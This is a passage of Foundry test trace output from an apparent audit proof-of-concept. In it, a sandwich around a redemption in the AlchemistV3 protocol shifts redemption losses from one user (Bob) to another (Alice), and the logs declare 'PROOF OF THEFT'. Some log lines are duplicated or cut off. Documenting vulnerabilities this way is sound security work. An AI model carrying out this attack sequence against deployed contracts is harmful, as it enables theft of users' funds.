    │   │   ├─ [452864] AlchemistV3::redeem(10000000000000000000000 [1e22]) [delegatecall]       
    │   │   │   ├─ [1715] MockMYTVault::balanceOf(Transmuter: [0x2387b3383E89c164781d173B7Aa14d9c46eD2642]) [staticcall]
    │   │   │   │   └─ ← [Return] 0
    │   │   │   ├─ [41515] Transmuter::queryGraph(3, 5256003 [5.256e6]) [staticcall]
    │   │   │   │   └─ ← [Return] 10000000000000000000000 [1e22]
    │   │   │   ├─ [1977] MockMYTVault::convertToAssets(0) [staticcall]
    │   │   │   │   └─ ← [Return] 0
    │   │   │   ├─ [1715] MockMYTVault::balanceOf(Transmuter: [0x2387b3383E89c164781d173B7Aa14d9c46eD2642]) [staticcall]
    │   │   │   │   └─ ← [Return] 0
    │   │   │   ├─ [1977] MockMYTVault::convertToAssets(0) [staticcall]
    │   │   │   │   └─ ← [Return] 0
    │   │   │   ├─ [3602] MockMYTVault::convertToShares(10000000000000000000000 [1e22]) [staticcall]
    │   │   │   │   └─ ← [Return] 10000000000000000000000 [1e22]
    │   │   │   ├─ [26990] MockMYTVault::transfer(Transmuter: [0x2387b3383E89c164781d173B7Aa14d9c46eD2642], 10000000000000000000000 [1e22])
    │   │   │   │   ├─ emit Transfer(from: TransparentUpgradeableProxy: [0x48c33395391C097df9c9aA887a40f1b47948D393], to: Transmuter: [0x2387b3383E89c164781d173B7Aa14d9c46eD2642], value: 10000000000000000000000 [1e22])
    │   │   │   │   └─ ← [Return] true
    │   │   │   ├─ [7090] MockMYTVault::transfer(PointEvaluation: [0x000000000000000000000000000000000000000A], 0)
    │   │   │   │   ├─ emit Transfer(from: TransparentUpgradeableProxy: [0x48c33395391C097df9c9aA887a40f1b47948D393], to: PointEvaluation: [0x000000000000000000000000000000000000000A], value: 0)
    │   │   │   │   └─ ← [Return] true
    │   │   │   ├─ emit Redemption(amount: 10000000000000000000000 [1e22])
    │   │   │   └─ ← [Stop]
    │   │   └─ ← [Return]
    │   ├─ [7021] TransparentUpgradeableProxy::fallback(10000000000000000000000 [1e22]) [staticcall]
    │   │   ├─ [6306] AlchemistV3::convertDebtTokensToYield(10000000000000000000000 [1e22]) [delegatecall]
    │   │   │   ├─ [3602] MockMYTVault::convertToShares(10000000000000000000000 [1e22]) [staticcall]
    │   │   │   │   └─ ← [Return] 10000000000000000000000 [1e22]
    │   │   │   └─ ← [Return] 10000000000000000000000 [1e22]
    │   │   └─ ← [Return] 10000000000000000000000 [1e22]
    │   ├─ [1712] TransparentUpgradeableProxy::fallback() [staticcall]
    │   │   ├─ [1000] AlchemistV3::myt() [delegatecall]
    │   │   │   └─ ← [Return] MockMYTVault: [0xd7D9fC89347Cc01C7707010604E99D146AC0C3BF]
    │   │   └─ ← [Return] MockMYTVault: [0xd7D9fC89347Cc01C7707010604E99D146AC0C3BF]
    │   ├─ [1715] MockMYTVault::balanceOf(Transmuter: [0x2387b3383E89c164781d173B7Aa14d9c46eD2642]) [staticcall]
    │   │   └─ ← [Return] 10000000000000000000000 [1e22]
    │   ├─ [1712] TransparentUpgradeableProxy::fallback() [staticcall]
    │   │   ├─ [1000] AlchemistV3::myt() [delegatecall]
    │   │   │   └─ ← [Return] MockMYTVault: [0xd7D9fC89347Cc01C7707010604E99D146AC0C3BF]
    │   │   └─ ← [Return] MockMYTVault: [0xd7D9fC89347Cc01C7707010604E99D146AC0C3BF]
    │   ├─ [11890] MockMYTVault::transfer(0x0000000000000000000000000000000000000DAd, 9990000000000000000000 [9.99e21])
    │   │   ├─ emit Transfer(from: Transmuter: [0x2387b3383E89c164781d173B7Aa14d9c46eD2642], to: 0x0000000000000000000000000000000000000DAd, value: 9990000000000000000000 [9.99e21])
    │   │   └─ ← [Return] true
    │   ├─ [1712] TransparentUpgradeableProxy::fallback() [staticcall]
    │   │   ├─ [1000] AlchemistV3::myt() [delegatecall]
    │   │   │   └─ ← [Return] MockMYTVault: [0xd7D9fC89347Cc01C7707010604E99D146AC0C3BF]
    │   │   └─ ← [Return] MockMYTVault: [0xd7D9fC89347Cc01C7707010604E99D146AC0C3BF]
    │   ├─ [28990] MockMYTVault::transfer(AlchemistV3Test: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 10000000000000000000 [1e19])
    │   │   ├─ emit Transfer(from: Transmuter: [0x2387b3383E89c164781d173B7Aa14d9c46eD2642], to: AlchemistV3Test: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 10000000000000000000 [1e19])
    │   │   └─ ← [Return] true
    │   ├─ [6329] AlchemicTokenV3::transfer(0x0000000000000000000000000000000000000DAd, 0)       
    │   │   ├─ emit Transfer(from: Transmuter: [0x2387b3383E89c164781d173B7Aa14d9c46eD2642], to: 0x0000000000000000000000000000000000000DAd, value: 0)
    │   │   └─ ← [Return] true
    │   ├─ [8329] AlchemicTokenV3::transfer(AlchemistV3Test: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0)
    │   │   ├─ emit Transfer(from: Transmuter: [0x2387b3383E89c164781d173B7Aa14d9c46eD2642], to: AlchemistV3Test: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 0)
    │   │   └─ ← [Return] true
    │   ├─ [5414] AlchemicTokenV3::burn(10000000000000000000000 [1e22])
    │   │   ├─ emit Transfer(from: Transmuter: [0x2387b3383E89c164781d173B7Aa14d9c46eD2642], to: 0x0000000000000000000000000000000000000000, value: 10000000000000000000000 [1e22])
    │   │   └─ ← [Stop]
    │   ├─ [2257] TransparentUpgradeableProxy::fallback(10000000000000000000000 [1e22])
    │   │   ├─ [1545] AlchemistV3::reduceSyntheticsIssued(10000000000000000000000 [1e22]) [delegatecall]
    │   │   │   └─ ← [Stop]
    │   │   └─ ← [Return]
    │   ├─ [1712] TransparentUpgradeableProxy::fallback() [staticcall]
    │   │   ├─ [1000] AlchemistV3::myt() [delegatecall]
    │   │   │   └─ ← [Return] MockMYTVault: [0xd7D9fC89347Cc01C7707010604E99D146AC0C3BF]
    │   │   └─ ← [Return] MockMYTVault: [0xd7D9fC89347Cc01C7707010604E99D146AC0C3BF]
    │   ├─ [1715] MockMYTVault::balanceOf(Transmuter: [0x2387b3383E89c164781d173B7Aa14d9c46eD2642]) [staticcall]
    │   │   └─ ← [Return] 0
    │   ├─ [3119] TransparentUpgradeableProxy::fallback(0)
    │   │   ├─ [2407] AlchemistV3::setTransmuterTokenBalance(0) [delegatecall]
    │   │   │   └─ ← [Stop]
    │   │   └─ ← [Return]
    │   ├─ emit PositionClaimed(claimer: 0x0000000000000000000000000000000000000DAd, amountClaimed: 9990000000000000000000 [9.99e21], amountUnclaimed: 0)
    │   └─ ← [Stop]
    ├─ [0] VM::stopPrank()
    │   └─ ← [Return]
    ├─ [0] VM::roll(5256004 [5.256e6])
    │   └─ ← [Return]
    ├─ [0] VM::startPrank(0x00000000000000000000000000000000000A11cE)
    │   └─ ← [Return]
    ├─ [4176] AlchemicTokenV3::approve(TransparentUpgradeableProxy: [0x48c33395391C097df9c9aA887a40f1b47948D393], 0)
    │   ├─ emit Approval(owner: 0x00000000000000000000000000000000000A11cE, spender: TransparentUpgradeableProxy: [0x48c33395391C097df9c9aA887a40f1b47948D393], value: 0)
    │   └─ ← [Return] true
    ├─ [266059] TransparentUpgradeableProxy::fallback(1, 25000000000000000000000 [2.5e22], 0x00000000000000000000000000000000000A11cE)
    │   ├─ [265338] AlchemistV3::mint(1, 25000000000000000000000 [2.5e22], 0x00000000000000000000000000000000000A11cE) [delegatecall]
    │   │   ├─ [1265] AlchemistV3Position::ownerOf(1) [staticcall]
    │   │   │   └─ ← [Return] 0x00000000000000000000000000000000000A11cE
    │   │   ├─ [1265] AlchemistV3Position::ownerOf(1) [staticcall]
    │   │   │   └─ ← [Return] 0x00000000000000000000000000000000000A11cE
    │   │   ├─ [1715] MockMYTVault::balanceOf(Transmuter: [0x2387b3383E89c164781d173B7Aa14d9c46eD2642]) [staticcall]
    │   │   │   └─ ← [Return] 0
    │   │   ├─ [1298] Transmuter::queryGraph(5256004 [5.256e6], 5256004 [5.256e6]) [staticcall]  
    │   │   │   └─ ← [Return] 0
    │   │   ├─ [1977] MockMYTVault::convertToAssets(0) [staticcall]
    │   │   │   └─ ← [Return] 0
    │   │   ├─ [3602] MockMYTVault::convertToShares(21666666666666666666666 [2.166e22]) [staticcall]
    │   │   │   └─ ← [Return] 21666666666666666666666 [2.166e22]
    │   │   ├─ [3602] MockMYTVault::convertToShares(25000000000000000000000 [2.5e22]) [staticcall]
    │   │   │   └─ ← [Return] 25000000000000000000000 [2.5e22]
    │   │   ├─ [3602] MockMYTVault::convertToShares(21666666666666666666666 [2.166e22]) [staticcall]
    │   │   │   └─ ← [Return] 21666666666666666666666 [2.166e22]
    │   │   ├─ [1977] MockMYTVault::convertToAssets(96666666666666666666666 [9.666e22]) [staticcall]
    │   │   │   └─ ← [Return] 96666666666666666666666 [9.666e22]
    │   │   ├─ [6302] AlchemicTokenV3::mint(0x00000000000000000000000000000000000A11cE, 25000000000000000000000 [2.5e22])
    │   │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: 0x00000000000000000000000000000000000A11cE, value: 25000000000000000000000 [2.5e22])
    │   │   │   └─ ← [Stop]
    │   │   ├─ emit Mint(tokenId: 1, amount: 25000000000000000000000 [2.5e22], recipient: 0x00000000000000000000000000000000000A11cE)
    │   │   └─ ← [Stop]
    │   └─ ← [Return]
    ├─ [0] VM::stopPrank()
    │   └─ ← [Return]
    ├─ [66011] TransparentUpgradeableProxy::fallback(1)
    │   ├─ [65299] AlchemistV3::poke(1) [delegatecall]
    │   │   ├─ [1265] AlchemistV3Position::ownerOf(1) [staticcall]
    │   │   │   └─ ← [Return] 0x00000000000000000000000000000000000A11cE
    │   │   ├─ [3602] MockMYTVault::convertToShares(46666666666666666666666 [4.666e22]) [staticcall]
    │   │   │   └─ ← [Return] 46666666666666666666666 [4.666e22]
    │   │   └─ ← [Stop]
    │   └─ ← [Return]
    ├─ [168597] TransparentUpgradeableProxy::fallback(2)
    │   ├─ [167885] AlchemistV3::poke(2) [delegatecall]
    │   │   ├─ [1265] AlchemistV3Position::ownerOf(2) [staticcall]
    │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000B0b
    │   │   ├─ [3602] MockMYTVault::convertToShares(43333333333333333333333 [4.333e22]) [staticcall]
    │   │   │   └─ ← [Return] 43333333333333333333333 [4.333e22]
    │   │   └─ ← [Stop]
    │   └─ ← [Return]
    ├─ [54971] TransparentUpgradeableProxy::fallback(1) [staticcall]
    │   ├─ [54250] AlchemistV3::getCDP(1) [delegatecall]
    │   │   └─ ← [Return] 96666666666666666666666 [9.666e22], 46666666666666666666666 [4.666e22], 0
    │   └─ ← [Return] 96666666666666666666666 [9.666e22], 46666666666666666666666 [4.666e22], 0  
    ├─ [54971] TransparentUpgradeableProxy::fallback(2) [staticcall]
    │   ├─ [54250] AlchemistV3::getCDP(2) [delegatecall]
    │   │   └─ ← [Return] 93333333333333333333333 [9.333e22], 43333333333333333333333 [4.333e22], 0
    │   └─ ← [Return] 93333333333333333333333 [9.333e22], 43333333333333333333333 [4.333e22], 0  
    ├─ [0] console::log("After Sandwich Attack:") [staticcall]
    │   └─ ← [Stop]
    ├─ [0] console::log("  Alice Collateral Loss:", 3333) [staticcall]
    │   └─ ← [Stop]
    ├─ [0] console::log("  Bob Collateral Loss:", 6666) [staticcall]
    │   └─ ← [Stop]
    ├─ [0] console::log("  Total Loss:", 10000 [1e4]) [staticcall]
    │   └─ ← [Stop]
    ├─ [0] console::log("") [staticcall]
    │   └─ ← [Stop]
    ├─ [0] console::log("=== PROOF OF THEFT ===") [staticcall]
    │   └─ ← [Stop]
    ├─ [0] console::log("Alice's Unfair Savings:", 1666) [staticcall]
    │   └─ ← [Stop]
    ├─ [0] console::log("Bob's Extra Loss:", 1666) [staticcall]
    │   └─ ← [Stop]
    ├─ [0] console::log("Wealth Stolen from Bob:", 1666) [staticcall]
    ├─ [0] console::log("Wealth Stolen from Bob:", 1666) [staticcall]
    │   └─ ← [Stop]
    ├─ [0] console::log("") [staticcall]
    │   └─ ← [Stop]
    ├─ [0] VM::assertApproxEqRel(1666666666666666666666 [1.666e21], 1666666666666666666667 [1.666    ├─ [0] VM::assertApproxEqRel(1666666666666666666666 [1.666e21], 1666666666666666666667 [1.666e21], 50000000000000000 [5e16], "Wealth transfer from Bob to Alice") [staticcall]
    │   └─ ← [Return]
    ├─ [0] console::log("VULNERABILITY CONFIRMED: Alice stole yield from Bob") [staticcall]
    │   └─ ← [Stop]
    ├─ [0] console::log("Impact: HIGH - Theft of Unclaimed Yield") [staticcall]
    │   └─ ← [Stop]
    ├─ [0] console::log("Alice avoided her fair share of redemption losses") [staticcall]
    │   └─ ← [Stop]
    ├─ [0] console::log("Bob paid more than his fair share") [staticcall]
    │   └─ ← [Stop]
    ├─ [0] console::log("Net wealth transfer from honest user to attacker\n") [staticcall]
    │   └─ ← [Stop]
    └─ ← [Return]

Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 19.97ms (11.52ms CPU time)

Ran 1 test suite in 30.64ms (19.97ms CPU time): 1 tests passed, 0 failed, 0 skipped (1 total tests)
```
